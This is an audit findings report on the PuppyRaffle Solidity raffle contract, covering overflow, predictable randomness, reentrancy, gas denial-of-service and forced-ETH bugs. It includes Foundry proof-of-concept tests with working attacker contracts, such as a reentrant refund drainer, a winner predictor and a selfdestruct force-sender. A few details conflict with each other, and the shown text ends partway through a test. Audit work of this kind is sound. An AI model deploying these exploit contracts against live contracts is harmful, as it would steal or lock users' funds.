# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### 🐶 Puppy Raffle Protocol
Puppy Raffle is a simple on-chain game that lets anyone compete for an ERC-721 NFT of an adorable dog.

1. **Entering the raffle**  
   • Players call `enterRaffle(address[] newPlayers)` and send an `entranceFee` (immutable).  
   • The passed array is de-duplicated; only fresh addresses are recorded in `players`.  
   • Each address can appear only once, eliminating Sybil abuse.

2. **Opt-out**  
   • Before a winner is drawn, a player can call `refund(playerIndex)` to reclaim their stake and remove themselves from the active set.

3. **Raffle lifecycle**  
   • `raffleStartTime` is set at deployment.  
   • After `raffleDuration` seconds, anyone can call `selectWinner()`.  
   • A pseudorandom index (based on block data) picks the winner, an NFT is **minted** to them, and funds are split: `entranceFee – protocolFee` → winner, `protocolFee` → `feeAddress`.

4. **Protocol admin**  
   • The contract owner can change the `feeAddress` and withdraw accumulated fees via `withdrawFees()`.

5. **Metadata**  
   • Each minted token maps to a rarity tier (`tokenIdToRarity`) with URI & name lookup, producing on-chain metadata through `tokenURI()`.

The contract is Solidity 0.7.6, inherits OpenZeppelin’s `ERC721` and `Ownable`, and is designed for straightforward Ethereum deployment and community raffles.
## High Risk Findings
[H-1]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-2]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-3]. DOS issue in PuppyRaffle::enterRaffle, selectWinner
## Medium Risk Findings
[M-1]. Randomness issue in PuppyRaffle::selectWinner
[M-2]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-3]. Reentrancy issue in PuppyRaffle::refund
[M-4]. DOS issue in PuppyRaffle::selectWinner
[M-5]. DOS issue in PuppyRaffle::enterRaffle
[M-6]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-7]. DOS issue in PuppyRaffle::selectWinner
[M-8]. Integer Overflow issue in PuppyRaffle::enterRaffle, selectWinner
## Low Risk Findings
[L-1]. Integer Overflow issue in PuppyRaffle::enterRaffle
## Info Risk Findings
[I-1]. Gas Grief BlockLimit issue in PuppyRaffle::selectWinner
[I-2]. Pausable Emergency Stop issue in PuppyRaffle::NA
[I-3]. Event Consistency issue in PuppyRaffle::selectWinner
[I-4]. Pragma issue in PuppyRaffle::NA
[I-5]. Pragma issue in PuppyRaffle::NA
[I-6]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees
[I-7]. DOS issue in PuppyRaffle::selectWinner


### Number of Findings
- H: 3
- M: 8
- L: 1
- I: 7



# High Risk Findings

## [H-1]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The contract uses Solidity version `0.7.6`, which does not have built-in protection against integer overflow and underflow, unlike versions `^0.8.0` and above. The `selectWinner` function calculates `totalAmountCollected` and `fee` using multiplication. The `totalFees` state variable is a `uint64` and is incremented by `fee`, which is a `uint256`. If `fee` exceeds the maximum value of a `uint64`, the cast `uint64(fee)` will silently truncate it, leading to an incorrect and lower fee amount being stored. This results in a loss of funds for the fee recipient.

## Impact
When `fee` exceeds `type(uint64).max`, the cast silently truncates the value that is added to `totalFees`. After the raffle ends the contract holds the full fee amount in its balance, but `totalFees` contains only the truncated remainder. Because `withdrawFees()` requires `address(this).balance == totalFees`, the call will always revert and *all collected fees become permanently locked in the contract*. This is a permanent denial-of-service for the fee recipient and traps user funds inside the contract.

## Proof of Concept
1. Deploy PuppyRaffle with `entranceFee = 1 ether`, `raffleDuration = 1 hours`.
2. Create 1,000 unique addresses and call `enterRaffle` once, sending 1,000 ether.
3. Fast-forward time and call `selectWinner()`. The winner receives 800 ETH, the contract keeps 200 ETH, but `totalFees` now holds only `uint64(200 ether) ≈ 15.5 ETH`.
4. The owner now calls `withdrawFees()`. The function reverts because `address(this).balance` (200 ETH) ≠ `totalFees` (≈15.5 ETH).
5. The 200 ETH stuck in the contract can never be withdrawn as every subsequent call to `withdrawFees()` will revert.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract FeeTruncationLockTest is Test {
    PuppyRaffle raffle;
    address feeRecipient = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeRecipient, 1 hours);
    }

    function test_FeesBecomeUnwithdrawable() public {
        uint256 playersCount = 1000;
        address[] memory entrants = new address[](playersCount);
        for (uint256 i; i < playersCount; ++i) {
            entrants[i] = address(uint160(i + 1));
        }

        vm.deal(address(this), 1000 ether);
        raffle.enterRaffle{value: 1000 ether}(entrants);

        vm.warp(block.timestamp + 2 hours);
        raffle.selectWinner();

        // Confirm that the contract really holds the full 20% fee (200 ether)
        assertEq(address(raffle).balance, 200 ether);

        // But totalFees has been truncated to uint64(200 ether)
        uint256 recordedFees = raffle.totalFees();
        assertTrue(recordedFees < 200 ether, "fees truncated");

        // Owner tries to withdraw – must revert because of balance mismatch
        vm.prank(raffle.owner());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Use OpenZeppelin's `SafeCast` library to safely cast from `uint256` to `uint64`, which will revert on overflow. Also, use `SafeMath` for all arithmetic operations since the compiler version is pre-0.8.0. The state variable `totalFees` should likely be a `uint256` to avoid this issue altogether.

```solidity
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/math/SafeCast.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint256;
    using SafeCast for uint256;

    // Change totalFees to uint256
    uint256 public totalFees;

    function selectWinner() external {
        // ...
        uint256 totalAmountCollected = uint256(players.length).mul(entranceFee);
        uint256 prizePool = totalAmountCollected.mul(80).div(100);
        uint256 fee = totalAmountCollected.mul(20).div(100);

        // No longer need to cast, and addition is safe
        totalFees = totalFees.add(fee);

        // ...
    }
}
```

## [H-2]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The randomness used to select a winner and determine NFT rarity is derived from `block.timestamp` and `block.difficulty` (`prevrandao`). These values are predictable and can be influenced by a miner. A malicious miner who is participating in the raffle can manipulate the outcome by choosing whether to include the `selectWinner` transaction in a block they are mining, and by choosing a specific timestamp for that block. This allows them to significantly increase their chances of winning or receiving a rare NFT.

## Impact
The integrity of the raffle is compromised. A miner can manipulate the winner selection process, undermining the fairness of the game and potentially stealing the prize pool. This leads to a loss of user trust and funds.

## Proof of Concept
1. Attacker (who is also the block producer) waits until the raffle period is over.
2. Off-chain he brute-forces a few candidate timestamps (Ethereum allows the proposer to choose any value within ~15s of the parent) and computes:
   winnerIdx = uint256(keccak256(abi.encodePacked(attacker, ts, prevrandao))) % players.length
3. As soon as `winnerIdx` equals the index of his own address in `players`, he seals the block with that timestamp and inserts the `selectWinner` transaction that he sends from his own account.
4. Because the contract uses exactly the same entropy, the attacker is deterministically selected as the winner and receives 80 % of the pool plus an NFT whose rarity he can game in the same way (second hash only depends on `msg.sender` and `prevrandao`).
5. No honest user can obtain the same guarantee; the raffle is therefore not fair.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract TimestampManipulationTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 1 days;
    address constant FEE_ADDRESS = address(1);

    address attacker = address(0xBAD);
    address[4] players;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);
        players = [address(0x111), address(0x222), attacker, address(0x333)];

        vm.deal(players[0], 4 ether); // fund only one account that pays for all
        vm.prank(players[0]);
        raffle.enterRaffle{value: ENTRANCE_FEE * players.length}(players);
    }

    function test_AttackerCanGuaranteeWin() public {
        // Fast-forward to after raffle duration
        uint256 baseTs = block.timestamp + RAFFLE_DURATION + 1;

        // Attacker simulates different timestamps he could put in the block header
        uint256 winningTimestamp;
        for (uint256 i = 0; i < 20; i++) {
            uint256 ts = baseTs + i; // ≤ 15s drift allowed by consensus
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, ts, block.difficulty))) % players.length;
            if (idx == 2) { // attacker is at index 2 in `players`
                winningTimestamp = ts;
                break;
            }
        }
        require(winningTimestamp != 0, "did not find ts in search window");

        // Block proposer sets the chosen timestamp and calls selectWinner
        vm.warp(winningTimestamp);
        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "attacker should be winner");
    }
}

## Suggested Mitigation
Use a provably random source of entropy like Chainlink VRF (Verifiable Random Function). This is the industry standard for on-chain games and raffles. VRF provides randomness that is verifiable and cannot be manipulated by miners or the oracle itself.

```solidity
// Example using Chainlink VRF
import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBaseV2 {
    VRFCoordinatorV2Interface COORDINATOR;
    // ... other state variables

    // constructor would need to initialize VRF settings

    function selectWinner() external {
        // ... checks
        COORDINATOR.requestRandomWords(
            // parameters for VRF request
        );
    }

    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        uint256 winnerIndex = randomWords[0] % players.length;
        // ... continue with winner selection logic using the secure random number
    }
}
```

## [H-3]. DOS issue in PuppyRaffle::enterRaffle, selectWinner

## Description
The contract contains gas-intensive loops over the `players` array in two key functions:
1. `enterRaffle`: A nested loop with O(n^2) complexity is used to check for duplicate players. As the number of players `n` grows, the gas cost increases quadratically.
2. `selectWinner`: The function uses `delete players;` to reset the array. This operation iterates through the entire array, and its gas cost is linear O(n) to the number of players.
An attacker can add a large number of players over time, causing the gas cost of these functions to exceed the block gas limit, leading to a permanent denial of service.

## Impact
If the players array becomes very large, both `enterRaffle` (quadratic duplicate-check) and `selectWinner` (linear `delete players`) will exceed the block gas limit and revert. Because these two functions are essential for progressing the protocol, the raffle gets permanently stuck: no new players can join, no winner can ever be picked, and all ether locked in the contract (prize pool + fees) is lost.

## Proof of Concept
1. The attacker calls `enterRaffle` 20,000 times, each time with a fresh address, inflating `players`.
2. Gas used per call grows quadratically; after enough iterations any further `enterRaffle` reverts OOG, freezing new entries.
3. When the raffle duration elapses, calling `selectWinner` executes `delete players`, which touches every storage slot. With 20,000 entries this already costs >30 M gas and will always OOG, so the raffle can never complete.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PuppyRaffle_DoSTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 wei;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, makeAddr("fee"), 1 days);
    }

    function test_selectWinner_OOG() public {
        uint256 n = 20000; // large enough to exceed block gas limit
        address[] memory one = new address[](1);
        for (uint256 i; i < n; i++) {
            one[0] = address(uint160(i + 1));
            raffle.enterRaffle{value: FEE}(one);
        }
        vm.warp(block.timestamp + 2 days);
        bytes memory data = abi.encodeWithSignature("selectWinner()");
        vm.expectRevert();              // out-of-gas reverts with empty data
        address(raffle).call{gas: 7_000_000}(data); // realistic block-gas limit
    }
}


## Suggested Mitigation
Use a mapping(address => bool) to track existing players and prevent duplicates in O(1). Replace `delete players;` with `players = new address[](0);` (or just set `players.length = 0`) so only the length slot is cleared. If historical data is needed, store it elsewhere or process the cleanup in batches so that no single transaction has to touch an unbounded number of storage slots.



# Medium Risk Findings

## [M-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The randomness used to select a winner and determine NFT rarity is derived from on-chain, predictable variables: `msg.sender`, `block.timestamp`, and `block.difficulty` (now `prevrandao`). A malicious miner or a front-running bot can predict or influence the outcome. A miner can choose to include/exclude their own transaction to win, or manipulate the block's timestamp. A front-runner can observe a pending call to `selectWinner` in the mempool, calculate the outcome, and if it's not favorable, front-run it with their own call to try and win.

## Impact
Because the random seed depends only on information known or controllable by the transaction sender (msg.sender) and the block producer (timestamp / prevrandao), the sender or a miner can deterministically decide whether they will be the winner before broadcasting the transaction. They simply compute the result off-chain; if they are not the winner they discard the tx and try again next block. Over many blocks this gives them an almost-certain chance of stealing the entire prize pool and the rarest NFT, causing direct monetary loss to honest players and destroying the raffle’s fairness.

## Proof of Concept
1. Assume 4 players have already entered the raffle.
2. The attacker deploys `AttackRaffle`, calls `predictWinnerIndex(4)` off-chain (static-call) and learns whether their contract would be the winner in the current block.
3. If they would win, the attacker sends the transaction calling `attack()` which in turn calls `selectWinner()`.
4. If the calculation shows they will not win, they simply withhold the transaction and try again in the next block with a new timestamp / prevrandao value.
5. Whenever the pre-check returns true, the attacker publishes the tx and deterministically obtains the prize pool and the minted NFT.

Because the attacker decides whether the transaction is ever mined, their success probability converges to 100 %.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract AttackRaffle {
    PuppyRaffle public raffle;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    // Off-chain call used by the attacker to know if they will win
    function predictWinnerIndex(uint256 playersLength) external view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % playersLength;
    }

    function attack() external {
        raffle.selectWinner();
    }
}

contract RandomnessExploitTest is Test {
    PuppyRaffle raffle;
    AttackRaffle attacker;
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xfee), 1 seconds);

        address[] memory entrants = new address[](4);
        entrants[0] = address(1);
        entrants[1] = address(2);
        entrants[2] = address(3);
        entrants[3] = address(4);

        vm.deal(address(this), ENTRANCE_FEE * 4);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(entrants);

        vm.warp(block.timestamp + 2); // raffle over

        attacker = new AttackRaffle(raffle);
    }

    function test_AttackerCanPredictAndWin() public {
        uint256 predicted = attacker.predictWinnerIndex(4);

        attacker.attack();

        assertEq(raffle.previousWinner(), raffle.players(predicted));
    }
}

## Suggested Mitigation
Replace in-contract pseudo-randomness with a verifiable randomness source such as Chainlink VRF or a commit-reveal scheme. The random value must be provided *after* the transaction is irreversible so that neither the caller nor the miner can influence or know it beforehand.

## [M-2]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function checks for duplicate players using a nested loop. The outer loop runs up to `players.length - 1` and the inner loop runs up to `players.length`. This results in a computational complexity of O(n^2), where n is the number of players already in the raffle. As the `players` array grows, the gas cost of this check increases quadratically. An attacker can exploit this by ensuring the `players` array is large, then anyone calling `enterRaffle` (even with a single new player) will have to pay an exorbitant gas fee, potentially causing their transaction to fail. This can effectively create a Denial of Service on the `enterRaffle` function.

## Impact
Attackers can make it prohibitively expensive for new players to join the raffle, effectively halting the game. Legitimate users will either have their transactions revert due to out-of-gas errors or will be forced to pay very high gas fees, discouraging participation.

## Proof of Concept
1. Deploy PuppyRaffle with a small entrance fee.
2. Record the gas needed to add the very first player (array size 0 → 1).
3. Add ~40 more unique players (array size grows to 41). Each addition is increasingly expensive but is borne by the attacker.
4. Record the gas needed to add the 42-nd player. Because the duplicate scan is O(n²) the cost will now be >15× larger than the baseline and can easily reach the block gas limit as n grows (e.g. a few hundred addresses).
5. Once the array is sufficiently large, any honest user who tries to join will either pay a prohibitive fee or revert with out-of-gas, effectively freezing the raffle.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract EnterRaffleGasTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, makeAddr("fee"), 1 hours);
    }

    function testGasExplodesQuadratically() public {
        // 1. Baseline gas with empty array
        uint256 baseGas = _enterSingle(address(0x1));

        // 2. Attacker inflates the array
        for (uint256 i = 2; i <= 41; i++) {
            _enterSingle(address(uint160(i)));
        }

        // 3. Gas after players.length == 41
        uint256 postGas = _enterSingle(address(0x42));

        // 4. Assert quadratic growth ( >15x is an arbitrary but stable threshold )
        assertGt(postGas, baseGas * 15, "Gas did not grow roughly quadratic");
    }

    // helper that adds one player and returns gas consumed
    function _enterSingle(address player) internal returns (uint256 used) {
        address[] memory arr = new address[](1);
        arr[0] = player;
        vm.deal(player, FEE);
        vm.prank(player);
        uint256 g0 = gasleft();
        raffle.enterRaffle{value: FEE}(arr);
        used = g0 - gasleft();
    }
}

## Suggested Mitigation
To prevent duplicate entries efficiently, use a mapping to track existing players. A `mapping(address => bool) public isPlayer` can provide O(1) lookup time. When a player enters, check and set their address in the mapping.

```solidity
// Add a new state variable
mapping(address => bool) public isPlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(
        msg.value == entranceFee * newPlayers.length,
        "PuppyRaffle: Must send enough to enter raffle"
    );
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        // O(1) check
        require(!isPlayer[player], "PuppyRaffle: Duplicate player");
        players.push(player);
        isPlayer[player] = true;
    }
    emit RaffleEnter(newPlayers);
}

// Remember to reset the `isPlayer` mapping for players when they are refunded or when a new raffle starts.
```

## [M-3]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends ETH to a user before updating the state that validates the refund (`players[playerIndex] = address(0)`). This violates the Checks-Effects-Interactions (CEI) security pattern. A malicious contract can call `refund` and use its `receive()` or `fallback()` function to re-enter the `refund` function before the player's address is zeroed out in the `players` array. This allows the attacker to repeatedly withdraw their `entranceFee`, draining the contract's balance. The vulnerable code is:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // Vulnerability: External call is made before state update
    (bool success, ) = address(msg.sender).call{value: entranceFee}("");
    require(success);

    // State is updated after the call, enabling re-entrancy
    players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
```

## Impact
A player can re-enter the refund function once before their address is cleared from the `players` array, allowing them to pull the entrance fee twice. The extra payment comes from the pool funded by other participants, so the protocol suffers a loss of one entrance fee per malicious player rather than a complete drain of all funds.

## Proof of Concept
1. An attacker deploys a contract (`Attacker.sol`).
2. The Attacker contract calls `PuppyRaffle.enterRaffle()` to join the game.
3. Other legitimate users join the raffle, funding the contract with ETH.
4. The Attacker contract calls `PuppyRaffle.refund()`.
5. The `PuppyRaffle` contract sends the `entranceFee` to the Attacker contract, triggering its `receive()` function.
6. Inside its `receive()` function, the Attacker contract calls `PuppyRaffle.refund()` again.
7. Because the `players` array has not yet been updated, the `require` checks pass, and the `PuppyRaffle` contract sends another `entranceFee`.
8. This process repeats until the `PuppyRaffle` contract's balance is drained.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle puppyRaffle;
    uint256 public timesCalled;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attack() public {
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        timesCalled++;
        if (address(puppyRaffle).balance >= puppyRaffle.entranceFee()) {
            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract PuppyRaffleReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1 ether;

    address USER1 = makeAddr("user1");
    address FEE_ADDRESS = makeAddr("fee_address");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, 60);
    }

    function test_ReentrancyOnRefund() public {
        Attacker attacker = new Attacker(puppyRaffle);

        address[] memory attackerPlayer = new address[](1);
        attackerPlayer[0] = address(attacker);

        address[] memory userPlayer = new address[](1);
        userPlayer[0] = USER1;

        vm.deal(address(attacker), ENTRANCE_FEE);
        vm.deal(USER1, ENTRANCE_FEE);

        // Attacker enters
        vm.prank(address(attacker));
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(attackerPlayer);

        // Other user enters, funding the contract
        vm.prank(USER1);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(userPlayer);

        assertEq(address(puppyRaffle).balance, 2 * ENTRANCE_FEE);
        uint256 attackerBalanceBefore = address(attacker).balance;

        // Attack
        vm.prank(address(attacker));
        attacker.attack();

        // Assertions
        uint256 attackerBalanceAfter = address(attacker).balance;
        assertEq(attacker.timesCalled(), 2, "Attacker should have re-entered");
        assertEq(attackerBalanceAfter, attackerBalanceBefore + (2 * ENTRANCE_FEE), "Attacker should have drained contract");
        assertEq(address(puppyRaffle).balance, 0, "Contract should be empty");
    }
}
```

## Suggested Mitigation
Apply the Checks-Effects-Interactions pattern by updating state variables before making external calls. In the `refund` function, zero out the player's address in the `players` array before sending the ETH.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+   // State is updated before the call
+   players[playerIndex] = address(0);
+
    // External call is made after state update
    (bool success, ) = address(msg.sender).call{value: entranceFee}("");
    require(success, "PuppyRaffle: Failed to send refund");

-   players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
```

## [M-4]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function can be permanently blocked by a malicious winner. The function sends the prize pool to the winner using `winner.call{value: prizePool}("")`. If the winner is a smart contract that intentionally reverts when receiving Ether (e.g., has no `receive` or `fallback` function, or they explicitly revert), the `call` will fail. This causes `selectWinner` to revert. Since the winner is determined algorithmically and the state is only reset after a successful run, every subsequent call to `selectWinner` will pick the same malicious winner and revert, permanently trapping all funds in the contract.

## Impact
A malicious participant whose address cannot receive ether (or deliberately reverts) can repeatedly make `selectWinner` revert by calling it from an address that makes himself the computed winner. Because state-changes are reverted on every failure, the raffle never concludes and all deposits remain locked until someone manages to call `selectWinner` with a seed that chooses a payable winner – something the attacker can continuously front-run. This results in an indefinite (though not strictly permanent) denial-of-service and fund freeze.

## Proof of Concept
1. Attacker deploys `RevertingWinner` which has no `receive`/`fallback`.
2. Attacker funds four addresses he controls (A1 … A4) and enters them together with the `RevertingWinner` address (RW) so that `players` now contains `[A1, A2, A3, A4, RW]`.
3. After raffle duration passes, the attacker locally searches for a sender address `S` (it can be any address he controls, not necessarily a player) and a `timestamp` such that
   ```
   uint winnerIdx = uint256(keccak256(abi.encodePacked(S, timestamp, difficulty))) % players.length;
   players[winnerIdx] == RW;
   ```
   Finding such a pair is trivial off-chain by brute-force over the two controllable inputs `S` and `timestamp`.
4. The attacker sends a transaction at that `timestamp` (or front-runs to adjust the timestamp with minor delay) calling `selectWinner` from `S`.
5. The low-level ether transfer to `RW` reverts, which makes the whole transaction revert, so the raffle state is unchanged and funds remain inside the contract.
6. The attacker can repeat step 4 in every block, front-running honest users and keeping the raffle locked as long as he is willing to pay gas.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RevertingWinner {
    // no receive/fallback -> reverts on ETH transfer
}

contract DoSSelectWinnerTest is Test {
    PuppyRaffle raffle;
    RevertingWinner rw;

    uint256 constant FEE = 1 ether;

    address A1 = address(0xA1);
    address A2 = address(0xA2);
    address A3 = address(0xA3);
    address A4 = address(0xA4);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xFEE), 1 days);
        rw     = new RevertingWinner();

        address[] memory entrants = new address[](5);
        entrants[0] = A1;
        entrants[1] = A2;
        entrants[2] = A3;
        entrants[3] = A4;
        entrants[4] = address(rw);

        vm.deal(address(this), 10 ether);
        raffle.enterRaffle{value: FEE * entrants.length}(entrants);

        // fast-forward past raffle end
        vm.warp(block.timestamp + 2 days);
    }

    function test_DoS() public {
        /*
         * We brute-force the timestamp until our call makes the
         * RevertingWinner the selected winner, then expect revert.
         */
        for (uint i = 0; i < 20; i++) {
            uint ts = block.timestamp + i;
            uint idx = uint(keccak256(abi.encodePacked(address(this), ts, block.difficulty))) % 5;
            if (idx == 4) { // players[4] == RevertingWinner
                vm.warp(ts);
                vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
                raffle.selectWinner();
                return; // Test succeeded
            }
        }
        fail("Could not hit RevertingWinner in 20 attempts – increase loop if flaky");
    }
}

## Suggested Mitigation
Use a pull-over-push pattern: record each winner’s prize in a mapping and let them withdraw via `claimPrize()` instead of forcing an immediate transfer inside `selectWinner`. This decouples core logic from the winner’s ability to accept ether and removes the DoS vector.

## [M-5]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function checks for duplicate players by using a nested loop. The outer loop iterates from `i = 0` to `players.length - 1`, and the inner loop from `j = i + 1` to `players.length`. This results in a computational complexity of O(n^2), where n is the total number of players in the raffle. As the `players` array grows, the gas cost of calling `enterRaffle` will increase quadratically. Eventually, the transaction will consume more gas than the block gas limit, making it impossible for new players to enter and effectively causing a Denial of Service.

## Impact
The primary function `enterRaffle` can become unusable, preventing any new participants from joining the raffle. This halts the contract's main purpose and can lock it in a state where no new raffles can be started if the player count is high but not sufficient to select a winner.

## Proof of Concept
1. Deploy `PuppyRaffle` with a 1 ether entrance fee.
2. Insert 400 distinct addresses in eight batches of 50, paying the correct ether each batch.
3. Attempt to insert one additional player.  Because the duplicate-detection logic iterates over the whole `players` array for every comparison (O(n²)), the gas cost has grown to >2 000 000 at only 400 players and keeps increasing quadratically.  Above ~1 000 players the call will revert because it exceeds the block gas limit, permanently freezing new entries.
4. No player can ever be added afterwards, causing a denial-of-service for `enterRaffle`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract DoSEnterRaffleTest is Test {
    PuppyRaffle private raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, makeAddr("fee"), 1 days);
    }

    function testGasBlowsUpQuadratically() public {
        uint256 totalPlayers = 400;
        uint256 batchSize    = 50;
        uint256 numBatches   = totalPlayers / batchSize;

        vm.deal(address(this), ENTRANCE_FEE * (totalPlayers + 1));

        // fill the raffle with 400 unique players
        for (uint256 i; i < numBatches; i++) {
            address[] memory batch = new address[](batchSize);
            for (uint256 j; j < batchSize; j++) {
                batch[j] = address(uint160(i * batchSize + j + 1));
            }
            raffle.enterRaffle{value: ENTRANCE_FEE * batchSize}(batch);
        }

        // try to add one more player and record gas usage
        address[] memory last = new address[](1);
        last[0] = address(uint160(totalPlayers + 1));

        uint256 gasBefore = gasleft();
        raffle.enterRaffle{value: ENTRANCE_FEE}(last);
        uint256 gasAfter  = gasleft();

        uint256 gasUsed = gasBefore - gasAfter;
        assertTrue(gasUsed > 2_000_000, "Gas usage should exceed 2M with 400 players");
    }
}

## Suggested Mitigation
The O(n^2) duplicate check is inefficient. A more gas-efficient approach is to check for duplicates on the client-side. To enforce uniqueness on-chain, use a mapping to track existing players.

```diff
+ mapping(address => bool) private isPlayer;

 function enterRaffle(address[] memory newPlayers) public payable {
     require(
         msg.value == entranceFee * newPlayers.length,
         "PuppyRaffle: Must send enough to enter raffle"
     );
     for (uint256 i = 0; i < newPlayers.length; i++) {
+        require(!isPlayer[newPlayers[i]], "PuppyRaffle: Duplicate player");
         players.push(newPlayers[i]);
+        isPlayer[newPlayers[i]] = true;
     }
-
-    // This is O(n^2) and will not scale
-    for (uint256 i = 0; i < players.length - 1; i++) {
-        for (uint256 j = i + 1; j < players.length; j++) {
-            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-        }
-    }
     emit RaffleEnter(newPlayers);
 }
```
When the raffle ends, the `isPlayer` mapping would need to be cleared for all participants, which adds overhead to `selectWinner`.

## [M-6]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function includes a strict equality check: `require(address(this).balance == uint256(totalFees), "...")`. This check incorrectly assumes that the only funds in the contract should be the collected fees. However, ETH can be forcibly sent to any contract address using `selfdestruct`. If even 1 wei is sent to the `PuppyRaffle` contract via this method, `address(this).balance` will become greater than `totalFees`, causing the check to fail permanently. This will lock all legitimately collected fees in the contract forever.

## Impact
The protocol owner's fee revenue can be permanently locked within the contract by any external user at a negligible cost (the gas for a `selfdestruct`). This makes the fee collection mechanism completely unreliable and can lead to a permanent loss of funds for the fee recipient.

## Proof of Concept
1. A raffle is run, and `selectWinner` is called. A non-zero amount of fees is now stored in `totalFees` and held in the contract's balance.
2. An attacker deploys a simple contract that contains a `selfdestruct(payable(puppyRaffleAddress))` function.
3. The attacker calls this function, forcibly sending a small amount of ETH (e.g., 1 wei) to the `PuppyRaffle` contract.
4. Now, `address(puppyRaffle).balance` is equal to `totalFees + 1 wei`.
5. Any subsequent call to `withdrawFees` will revert because the balance check `address(this).balance == totalFees` will always be false.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ForceSender {
    function send(address payable recipient) public payable {
        selfdestruct(recipient);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle raffle;
    ForceSender forceSender;
    address feeAddress = address(0xfee);
    uint256 entranceFee = 1 ether;

    function setUp() public {
